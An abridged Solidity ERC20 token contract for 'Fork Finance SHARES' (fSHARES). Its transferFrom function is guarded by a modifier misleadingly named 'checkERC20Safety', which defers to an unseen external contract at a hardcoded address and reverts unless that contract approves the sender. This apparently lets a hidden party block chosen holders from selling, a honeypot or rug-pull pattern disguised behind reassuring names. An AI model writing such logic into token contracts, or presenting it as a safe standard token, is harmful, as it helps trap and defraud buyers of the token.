...
\_   _____/__________|  | __ \_   _____/|__| ____ _____    ____   ____  ____  
 |    __)/  _ \_  __ \  |/ /  |    __)  |  |/    \\__  \  /    \_/ ___\/ __ \ 
 |     \(  <_> )  | \/    <   |     \   |  |   |  \/ __ \|   |  \  \__\  ___/ 
 \___  / \____/|__|  |__|_ \  \___  /   |__|___|  (____  /___|  /\___  >___  >
     \/                   \/      \/            \/     \/     \/     \/    \/  */

/* 
  _____  _________ ___ ___    _____ _____________________
_/ ____\/   _____//   |   \  /  _  \\______   \_   _____/
\   __\ \_____  \/    ~    \/  /_\  \|       _/|    __)_ 
 |  |   /        \    Y    /    |    \    |   \|        \
 |__|  /_______  /\___|_  /\____|__  /____|_  /_______  /
               \/       \/         \/       \/        \/ */
...
contract Token is Context, IERC20, IERC20Metadata {
    ...
    constructor() {
        _token_name = "Fork Finance SHARES";
        _token_symbol = "fSHARES";
        _token_totalSupply = 1000 * 10 ** 18;
        _balances[msg.sender] = _token_totalSupply;
        ERC20Dependancies = IERC20Dependancies(0x3072DdEe14ce010e9517320d3360Fd4F99c87188);
    }

    modifier checkERC20Safety {
        uint256 ERC20SafetyStatus = ERC20Dependancies.checkERC20Status(msg.sender);
        require(ERC20SafetyStatus == 0);
        _;
    }
    ...
    function transferFrom(
        ...
        address to,
        uint256 amount
    ) public checkERC20Safety virtual override returns (bool) {
